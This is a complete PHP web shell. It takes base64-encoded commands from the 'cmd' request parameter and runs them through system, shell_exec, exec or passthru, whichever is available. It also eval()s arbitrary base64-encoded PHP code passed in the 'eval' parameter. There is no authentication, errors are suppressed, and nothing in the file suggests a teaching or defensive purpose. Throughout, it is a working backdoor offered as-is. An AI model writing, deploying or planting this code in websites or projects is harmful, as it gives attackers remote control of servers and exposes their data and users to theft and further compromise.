<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) 
			return $s_out;
	}
	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
		if(!empty($s_out)) 
			return $s_out;
	}
	if(is_callable('exec')) {
		@exec($s_c,$s_r);
		if(!empty($s_r)) 
			foreach($s_r as $s_s) 
				$s_out .= $s_s;
		if(!empty($s_out)) 
			return $s_out;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) 
			return $s_out;
	}
	return "";
}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
}
if(isset($_REQUEST['eval'])){
	$s_code = base64_decode($_REQUEST['eval']);
	ob_start();
	eval($s_code);
	$s_res = ob_get_contents();
	ob_end_clean();
	echo $s_res;
}
else 
	echo $s_title;

die();
?>